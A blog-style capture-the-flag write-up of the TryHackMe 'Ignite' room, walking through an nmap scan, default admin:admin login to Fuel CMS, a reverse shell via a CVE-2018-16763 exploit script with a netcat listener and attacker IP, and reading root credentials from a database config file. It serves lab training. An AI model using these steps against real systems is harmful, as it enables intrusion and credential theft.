---
layout: post
title: "Ignite CTF Write-up"
date: 2026-10-02
link: https://tryhackme.com/room/ignite
link_text: "Ignite"
categories: ctf-writeups
---

# Finding User.txt

The first step is to run an Nmap scan.

`nmap -sS -A -p- -T4 [target IP]`

- `-sS`: runs a TCP SYN scan
- `-A`: enables OS detection, version detection, script scanning, and traceroute
- `-p-`: sets the port range from 1-65535
- `-T4`: sets the aggressiveness of the scan to a 4 out of 5

![](/assets/writeup_assets/ignite_ctf_writeup/nmap.png)
*Figure 1: Relevant part of the Nmap scan*

The only open port is port 80 running `HTTP`. Check the `/robots.txt` file for clues.

![](/assets/writeup_assets/ignite_ctf_writeup/robots.png)
*Figure 2: /robots.txt*

The file contains a disallowed path `/fuel/`. Go there to see what it is.

![](/assets/writeup_assets/ignite_ctf_writeup/login_screen.png)*Figure 3: Login screen at /fuel path*

It is a login screen. A quick search can find the standard default credentials are `admin:admin`. Try to login with these credentials.

![](/assets/writeup_assets/ignite_ctf_writeup/logged_in.png)
*Figure 4: Logged in*

It worked. Now look for a way to get that `User.txt` file.

GitHub user [CovertOperation](https://github.com/CovertOperation) has created an exploit that produces a user-level shell, leveraging [CVE-2018-16763](https://www.cve.org/CVERecord?id=CVE-2018-16763). To use it, complete the following process:

1. Download the Python script from the [Fuel CMS exploit ](https://github.com/CovertOperation/Fuel-CMS-1.4.1).
2. Start a `netcat` listener on a new terminal tab with `nc -lvnp 4444`.
3. Run the script from the `/Downloads` folder with `python3 CVE-Fuel.py http://[target IP] [attacker IP] 4444`.

Now that the reverse shell is active, go to `/home/www-data` to get the first flag.

![](/assets/writeup_assets/ignite_ctf_writeup/flag1.png)
*Figure 5: Flag 1*

---
# Finding Root.txt

First, spawn a nicer shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

To escalate privileges, look at the home page of the website. In step 2, it says, "...change the database configuration file found in `fuel/application/config/database.php` to include your hostname (e.g. localhost), username, **password**...". This file may contain the root password. Navigate there and find out.

![](/assets/writeup_assets/ignite_ctf_writeup/root_creds.png)
*Figure 6: root account credentials*

Now, all that is left to do is switch accounts and get the root flag.

![](/assets/writeup_assets/ignite_ctf_writeup/flag2.png)
*Figure 7: Flag 2*
